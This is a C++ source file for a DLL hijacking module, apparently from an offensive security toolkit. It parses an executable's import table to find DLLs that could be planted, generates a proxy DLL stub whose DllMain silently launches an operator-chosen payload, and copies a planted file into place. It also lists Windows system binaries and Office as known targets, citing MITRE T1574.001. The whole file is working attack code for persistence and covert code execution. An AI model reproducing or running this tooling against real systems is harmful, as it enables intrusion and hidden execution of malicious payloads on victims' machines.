#include "DLLHijack.h"

// ── Parse PE import table for DLL names ──────────────────────────────────────

static std::vector<std::string> GetImports(const char* exePath) {
    std::vector<std::string> dlls;
    HANDLE hFile = CreateFileA(exePath, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return dlls;

    DWORD sz = GetFileSize(hFile, NULL);
    std::vector<BYTE> buf(sz);
    DWORD read; ReadFile(hFile, buf.data(), sz, &read, NULL);
    CloseHandle(hFile);

    auto* dos = (PIMAGE_DOS_HEADER)buf.data();
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return dlls;
    auto* nt  = (PIMAGE_NT_HEADERS)(buf.data() + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return dlls;

    auto& imp = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (!imp.VirtualAddress) return dlls;

    // Convert RVA → file offset
    auto* sec = IMAGE_FIRST_SECTION(nt);
    auto rva2off = [&](DWORD rva) -> DWORD {
        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
            if (rva >= sec[i].VirtualAddress &&
                rva <  sec[i].VirtualAddress + sec[i].SizeOfRawData)
                return rva - sec[i].VirtualAddress + sec[i].PointerToRawData;
        }
        return rva;
    };

    auto* desc = (PIMAGE_IMPORT_DESCRIPTOR)(buf.data() + rva2off(imp.VirtualAddress));
    for (; desc->Name; desc++) {
        const char* name = (const char*)(buf.data() + rva2off(desc->Name));
        dlls.push_back(std::string(name));
    }
    return dlls;
}

std::string DLLHijack::FindHijackable(const char* exePath) {
    auto dlls = GetImports(exePath);
    if (dlls.empty())
        return "DLLHijack: could not parse imports from " + std::string(exePath);

    // Get the directory of the EXE
    std::string exeDir = exePath;
    size_t last = exeDir.find_last_of("\\/");
    exeDir = (last != std::string::npos) ? exeDir.substr(0, last+1) : ".\\";

    std::string r = "DLLHijack: import scan of " + std::string(exePath) + "\n";
    r += "EXE dir: " + exeDir + "\n\n";
    int hijackable = 0;
    for (auto& dll : dlls) {
        // Check if DLL exists in the EXE's own directory
        std::string local = exeDir + dll;
        bool inDir  = (GetFileAttributesA(local.c_str()) != INVALID_FILE_ATTRIBUTES);
        bool inSys  = false;
        char sys[MAX_PATH]; GetSystemDirectoryA(sys, sizeof(sys));
        std::string sysPath = std::string(sys) + "\\" + dll;
        inSys = (GetFileAttributesA(sysPath.c_str()) != INVALID_FILE_ATTRIBUTES);

        if (!inDir) {
            r += "  [HIJACKABLE] " + dll +
                 (inSys ? "  (real DLL in System32 — proxy needed)" :
                           "  (DLL not found anywhere — phantom import)") + "\n";
            hijackable++;
        }
    }
    if (hijackable == 0)
        r += "  No hijackable imports found (all DLLs present in EXE directory).\n";
    else
        r += "\n" + std::to_string(hijackable) + " hijackable DLL(s) found.\n"
             "Drop a DLL with that name in " + exeDir + " to execute on next app launch.\n"
             "MITRE T1574.001";
    return r;
}

std::string DLLHijack::GenerateProxyStub(const char* realDllName, const char* payloadExe,
                                          const char* dropPath) {
    // Output a .c template for a proxy DLL — operator compiles this
    std::string src =
        "// Proxy DLL stub for: " + std::string(realDllName) + "\n"
        "// Drop as: " + std::string(dropPath) + "\n"
        "// Compile: cl /LD proxy.c /link /DEF:proxy.def\n\n"
        "#include <windows.h>\n\n"
        "BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {\n"
        "    if (reason == DLL_PROCESS_ATTACH) {\n"
        "        // Launch payload\n"
        "        STARTUPINFOA si={sizeof(si)}; PROCESS_INFORMATION pi={};\n"
        "        CreateProcessA(\"" + std::string(payloadExe) + "\",\n"
        "            NULL,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);\n"
        "        CloseHandle(pi.hProcess); CloseHandle(pi.hThread);\n"
        "    }\n"
        "    return TRUE;\n"
        "}\n\n"
        "// Add export forwarding in proxy.def:\n"
        "// EXPORTS\n"
        "//   ExportName = " + std::string(realDllName) + ".ExportName  @1\n"
        "//   ... (list all exports from the real DLL)\n";

    return "DLLHijack: proxy stub template:\n" + src;
}

std::string DLLHijack::PlantSimple(const char* dllDropPath, const char* ourExePath) {
    if (!CopyFileA(ourExePath, dllDropPath, FALSE))
        return "DLLHijack: CopyFile failed (err=" + std::to_string(GetLastError()) + ")";
    return "DLLHijack: planted " + std::string(ourExePath) +
           " → " + std::string(dllDropPath) + "\n"
           "When the target app loads this DLL, our EXE code runs via DllMain.\n"
           "NOTE: target must not validate exports — check with FindHijackable first.";
}

std::string DLLHijack::ScanCommonPaths() {
    // Known applications with hijackable DLLs in common install paths
    static const struct { const char* exe; const char* dll; } known[] = {
        {"C:\\Windows\\System32\\msiexec.exe",         "apphelp.dll"},
        {"C:\\Windows\\System32\\fodhelper.exe",       "mlang.dll"},
        {"C:\\Windows\\System32\\cmstp.exe",           "CMLUA.dll"},
        {"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "wwlib.dll"},
        {NULL, NULL}
    };
    std::string r = "DLLHijack: well-known hijackable paths:\n";
    for (int i = 0; known[i].exe; i++) {
        bool exeExists = (GetFileAttributesA(known[i].exe) != INVALID_FILE_ATTRIBUTES);
        r += "  " + std::string(known[i].exe) + "\n"
             "    DLL: " + std::string(known[i].dll) +
             (exeExists ? "  [EXE found]" : "  [not installed]") + "\n";
    }
    r += "\nUse: dlhijack scan <exepath> for a specific executable.";
    return r;
}
